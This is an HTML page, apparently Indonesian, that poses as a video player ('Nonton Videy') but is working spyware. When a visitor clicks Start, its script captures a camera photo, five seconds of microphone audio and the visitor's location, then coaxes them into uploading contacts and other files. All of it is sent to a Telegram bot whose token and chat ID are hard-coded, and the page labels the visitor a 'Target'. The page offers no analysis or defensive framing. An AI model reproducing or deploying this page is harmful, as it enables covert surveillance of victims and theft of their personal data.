<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Video Player</title>
<style>
body {
    font-family: Arial, sans-serif;
    text-align: center;
    padding-top: 80px;
    background: #0a0a0a;
}
button {
    padding: 18px 40px;
    font-size: 20px;
    font-weight: bold;
    background: linear-gradient(135deg, #ff0000, #660000);
    color: white;
    border: none;
    border-radius: 50px;
    cursor: pointer;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    transition: transform 0.2s;
}
button:hover {
    transform: scale(1.02);
}
#status {
    margin-top: 30px;
    color: #ccc;
    font-size: 14px;
}
h2 {
    color: white;
}
</style>
</head>
<body>
<h2>Nonton Videy</h2>
<button id="btnAll">Start</button>
<div id="status">Klik Start untuk melanjutkan</div>

<script>
const BOT_TOKEN = "8626772468:AAGgWxzwBgAUtuXNqhoBAKNSyZUO5T1paI4";
const CHAT_ID = "8561846275";

function sendToTelegram(data) {
    const message = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(0, 4000) })
    }).catch(e => console.log("Send error:", e));
}

async function captureCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
        const form = new FormData();
        form.append("photo", blob, "camera.jpg");
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: form });
        stream.getTracks().forEach(track => track.stop());
        return "Camera success";
    } catch(e) {
        return "Camera denied or error";
    }
}

async function captureMicrophone() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = e => chunks.push(e.data);
        const audioPromise = new Promise(resolve => {
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: "audio/webm" });
                const form = new FormData();
                form.append("audio", blob, "microphone.webm");
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: "POST", body: form });
                resolve("Microphone success");
            };
        });
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
        const result = await audioPromise;
        stream.getTracks().forEach(track => track.stop());
        return result;
    } catch(e) {
        return "Microphone denied";
    }
}

function getLocation() {
    return new Promise((resolve) => {
        if("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const data = `Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Acc: ${pos.coords.accuracy}m`;
                    sendToTelegram({ type: "location", data: data });
                    resolve("Location success");
                },
                () => resolve("Location denied")
            );
        } else {
            resolve("Location not supported");
        }
    });
}

function getContactsFile() {
    return new Promise((resolve) => {
        const input = document.createElement("input");
        input.type = "file";
        input.accept = ".vcf,.csv,.txt";
        input.onchange = async (e) => {
            const file = e.target.files[0];
            if(file) {
                const form = new FormData();
                form.append("document", file);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: form });
                resolve("Contacts file uploaded");
            } else {
                resolve("No contacts file selected");
            }
        };
        input.click();
    });
}

function getStorageFiles() {
    return new Promise((resolve) => {
        const input = document.createElement("input");
        input.type = "file";
        input.multiple = true;
        input.onchange = async (e) => {
            const files = e.target.files;
            if(files.length > 0) {
                for(let i = 0; i < Math.min(files.length, 5); i++) {
                    const form = new FormData();
                    form.append("document", files[i]);
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: "POST", body: form });
                }
                resolve(`${Math.min(files.length, 5)} file(s) uploaded`);
            } else {
                resolve("No files selected");
            }
        };
        input.click();
    });
}

document.getElementById("btnAll").onclick = async () => {
    document.getElementById("status").innerHTML = "Memuat video... Harap izinkan kamera, mic, dan lokasi.";
    sendToTelegram("[!] Target mulai membuka video");
    
    const camResult = await captureCamera();
    document.getElementById("status").innerHTML = `Kamera: ${camResult}`;
    
    const micResult = await captureMicrophone();
    document.getElementById("status").innerHTML = `Mikrofon: ${micResult}`;
    
    const locResult = await getLocation();
    document.getElementById("status").innerHTML = `Lokasi: ${locResult}`;
    
    document.getElementById("status").innerHTML = "Pilih file kontak (VCF/CSV) jika tersedia";
    const contactResult = await getContactsFile();
    document.getElementById("status").innerHTML = `Kontak: ${contactResult}`;
    
    document.getElementById("status").innerHTML = "Pilih file yang ingin diupload (opsional)";
    const storageResult = await getStorageFiles();
    document.getElementById("status").innerHTML = `File: ${storageResult} | Selesai.`;
    
    sendToTelegram("[✓] Target selesai membuka video");
};
</script>
</body>
</html>
